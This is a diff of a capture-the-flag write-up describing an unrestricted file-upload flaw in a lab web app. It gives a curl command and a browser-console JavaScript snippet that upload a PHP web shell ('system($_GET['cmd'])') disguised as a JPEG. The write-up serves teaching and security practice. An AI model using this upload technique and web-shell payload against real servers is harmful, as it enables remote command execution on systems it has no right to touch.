@@ -9,29 +9,38 @@ We attempted uploading various file types, and eventually tried uploading a `.ph
 Using `curl`, we submitted the following request:
 
 ```
-curl -F "uploaded=@shell.php;type=image/jpeg" -F "Upload=Upload" http://192.168.1.101/?page=upload
+curl -F "uploaded=@shell.php;type=image/jpeg" -F "Upload=Upload" http://{IP}/?page=upload
 ```
 
 The server did not perform backend validation of file contents or extension, and the file was successfully uploaded and interpreted as PHP.
 
-Upon execution of the uploaded script, the server responded with:
+Upon execution of the uploaded script, the server responded with the [flag](../flag)
 
-``The flag is: [actual flag value]``
+
 
 To simplify the process, we wrote a JavaScript snippet that replicates the upload directly from the browser console. This eliminates the need for external tools like `curl`.
 
 > You can run the following script directly in the browser's developer console:
 
 ```javascript
-// upload-image.js
-const formData = new FormData();
-formData.append("Upload", "Upload");
-formData.append("uploaded", new File(["<?php echo shell_exec($_GET['cmd']); ?>"], "shell.php", { type: "image/jpeg" }));
-
-fetch("http://192.168.1.101/?page=upload", {
-  method: "POST",
-  body: formData
-}).then(res => res.text()).then(html => console.log("Uploaded. Check server response or path."));
+const payload = `<?php system($_GET['cmd']); ?>`;
+const file = new Blob([payload], { type: "image/jpeg" });
+const form = new FormData();
+form.append("uploaded", file, "shell.php");
+form.append("Upload", "Upload");
+fetch(window.location.href, {
+    method: "POST",
+    body: form
+}).then(response => {
+    return response.text();
+}).then(html => {
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, "text/html");
+    document.replaceChild(
+        document.adoptNode(doc.documentElement),
+        document.documentElement
+    );
+});
 ```
 
 ## Vulnerability Details
